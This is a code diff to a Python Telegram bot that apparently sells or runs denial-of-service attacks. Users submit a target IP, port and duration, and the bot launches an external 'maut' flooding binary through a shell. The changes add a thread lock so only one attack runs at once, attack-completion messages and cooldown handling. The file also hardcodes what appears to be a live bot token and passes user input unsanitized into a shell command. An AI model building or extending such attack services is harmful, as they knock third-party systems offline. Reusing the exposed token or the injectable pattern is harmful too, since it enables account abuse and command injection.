@@ -5,6 +5,7 @@ import os
 from telebot import types
 import time
 import re
+from threading import Lock
 
 # Bot configuration
 bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
@@ -21,6 +22,8 @@ user_attack_data = {}
 maut_cooldown = {}
 allowed_user_ids = []
 user_time_limits = {}
+active_attacks = {}  # Track active attacks
+attack_lock = Lock()  # Thread lock for attack operations
 
 def load_users():
     global allowed_user_ids, user_time_limits
@@ -74,6 +77,31 @@ def parse_time_input(time_str):
     
     return total_seconds if total_seconds > 0 else None
 
+def is_attack_active():
+    with attack_lock:
+        return bool(active_attacks)
+
+def add_active_attack(user_id, attack_time):
+    with attack_lock:
+        active_attacks[user_id] = {
+            'start_time': datetime.datetime.now(),
+            'duration': attack_time
+        }
+
+def remove_active_attack(user_id):
+    with attack_lock:
+        if user_id in active_attacks:
+            del active_attacks[user_id]
+
+def get_active_attack_info():
+    with attack_lock:
+        if not active_attacks:
+            return None
+        user_id, attack = next(iter(active_attacks.items()))
+        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
+        remaining = max(0, attack['duration'] - elapsed)
+        return user_id, remaining
+
 @bot.message_handler(commands=['start'])
 def start_command(message):
     caption = """
@@ -112,7 +140,18 @@ def handle_attack_command(message):
     if user_id not in allowed_user_ids:
         return bot.reply_to(message, "❌ Access denied. `@seedhe_maut_bot`.")
     
-    # Check cooldown first
+    # Check if another attack is active
+    active_info = get_active_attack_info()
+    if active_info:
+        active_user_id, remaining = active_info
+        try:
+            active_user = bot.get_chat(active_user_id)
+            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
+            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
+        except:
+            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
+    
+    # Check cooldown
     if user_id in maut_cooldown:
         remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
         if remaining > 0:
@@ -187,6 +226,9 @@ def handle_buttons(call):
         
         data = user_attack_data[user_id]
         try:
+            # Mark attack as active
+            add_active_attack(user_id, int(data['time']))
+            
             # Execute attack
             subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", shell=True)
             log_attack(user_id, data['ip'], data['port'], data['time'])
@@ -194,22 +236,40 @@ def handle_buttons(call):
             
             # Update message
             bot.edit_message_text(
-    chat_id=call.message.chat.id,
-    message_id=call.message.message_id,
-    text=f"🔥 *Attack Launched!* 🔥\n\n"
-         f"🌐 Target: `{data['ip']}`\n"
-         f"🔌 Port: `{data['port']}`\n"
-         f"⏱ Duration: `{data['time']}`s\n\n"
-         f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
-    parse_mode="Markdown"
-)
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=f"🔥 *Attack Launched!* 🔥\n\n"
+                     f"🌐 Target: `{data['ip']}`\n"
+                     f"🔌 Port: `{data['port']}`\n"
+                     f"⏱ Duration: `{data['time']}`s\n\n"
+                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
+                parse_mode="Markdown"
+            )
+            
+            # Schedule attack completion message
+            attack_duration = int(data['time'])
+            time.sleep(attack_duration)
+            
+            # Send completion message
+            bot.send_message(
+                call.message.chat.id,
+                f"✅ *Attack Completed!*\n\n"
+                f"🌐 Target: `{data['ip']}`\n"
+                f"⏱ Duration: `{data['time']}`s\n\n"
+                f"Cooldown: {COOLDOWN_TIME//60} minutes",
+                parse_mode="Markdown"
+            )
+            
+            # Remove from active attacks
+            remove_active_attack(user_id)
             
             # Add new attack button
             markup = types.InlineKeyboardMarkup()
             markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
-            bot.send_message(call.message.chat.id, "✅ Attack started successfully!", reply_markup=markup)
+            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
             
         except Exception as e:
+            remove_active_attack(user_id)
             bot.edit_message_text(
                 chat_id=call.message.chat.id,
                 message_id=call.message.message_id,
